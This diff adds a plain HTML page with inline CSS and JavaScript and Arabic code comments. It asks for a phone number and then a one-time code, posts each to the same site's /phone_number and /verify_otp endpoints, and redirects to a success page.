@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Number Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: url('/static/background-image.jpg') no-repeat center center fixed;
+            background-size: cover; /* تأكد من أن الصورة تغطي الخلفية بالكامل */
+        }
+        .container {
+            background: rgba(128, 128, 128, 0.7); /* اللون الرمادي مع شفافية */
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 100%;
+            text-align: center;
+            margin: 0 auto;
+            margin-top: 50px;
+            color: white; /* لون الكتابة أبيض */
+        }
+        .hidden {
+            display: none;
+        }
+        input {
+            margin-bottom: 10px;
+            padding: 8px;
+            width: 100%;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            color: #333;
+        }
+        button {
+            padding: 10px;
+            width: 100%;
+            border: none;
+            background: linear-gradient(45deg, #800080, #FFC0CB); /* تدرج لوني من البنفسجي إلى الوردي */
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:disabled {
+            background: linear-gradient(45deg, #ccc, #ccc); /* تدرج لوني رمادي عند التعطيل */
+        }
+        .message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 4px;
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+        .loading {
+            display: none;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.8);
+        }
+        .spinner {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        </p>ها قارع مالك مقلق..</p>
+    </div>
+    <div class="container">
+        <div id="phone-form">
+            <h2>Enter Your Phone Number</h2>
+            <input type="text" id="phone-number" placeholder="                                        Phone Number😒" />
+            <button id="submit-phone">Submit</button>
+        </div>
+        <div id="otp-form" class="hidden">
+            <h2>Enter OTP Code</h2>
+            <input type="text" id="otp-code" placeholder="                                               OTP CODE😒" />
+            <button id="submit-otp">Submit</button>
+        </div>
+        <div id="message" class="hidden message"></div>
+    </div>
+
+    <script>
+        function showLoading() {
+            document.getElementById('loading').style.display = 'flex';
+        }
+
+        function hideLoading() {
+            document.getElementById('loading').style.display = 'none';
+        }
+
+        document.getElementById('submit-phone').addEventListener('click', async () => {
+            const phoneNumber = document.getElementById('phone-number').value;
+            showLoading();
+            const response = await fetch('/phone_number', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phone_number: phoneNumber })
+            });
+
+            const result = await response.json();
+            hideLoading();
+            const messageDiv = document.getElementById('message');
+            messageDiv.classList.remove('hidden');
+            
+            if (result.status === 'success') {
+                messageDiv.innerText = result.message;
+                messageDiv.classList.add('success');
+                document.getElementById('phone-form').classList.add('hidden');
+                document.getElementById('otp-form').classList.remove('hidden');
+            } else {
+                messageDiv.innerText = result.message;
+                messageDiv.classList.remove('success');
+                messageDiv.classList.add('message');
+            }
+        });
+
+        document.getElementById('submit-otp').addEventListener('click', async () => {
+            const otpCode = document.getElementById('otp-code').value;
+            const phoneNumber = document.getElementById('phone-number').value;
+            showLoading();
+            const response = await fetch('/verify_otp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phone_number: phoneNumber, otp: otpCode })
+            });
+
+            const result = await response.json();
+            hideLoading();
+            const messageDiv = document.getElementById('message');
+            messageDiv.classList.remove('hidden');
+            
+            if (result.status === 'success') {
+                messageDiv.innerText = result.message;
+                messageDiv.classList.add('success');
+                setTimeout(() => {
+                    window.location.href = '/success';
+                }, 2000); // Redirect after 2 seconds
+            } else {
+                messageDiv.innerText = result.message;
+                messageDiv.classList.remove('success');
+                messageDiv.classList.add('message');
+            }
+        });
+    </script>
+</body>
+</html>
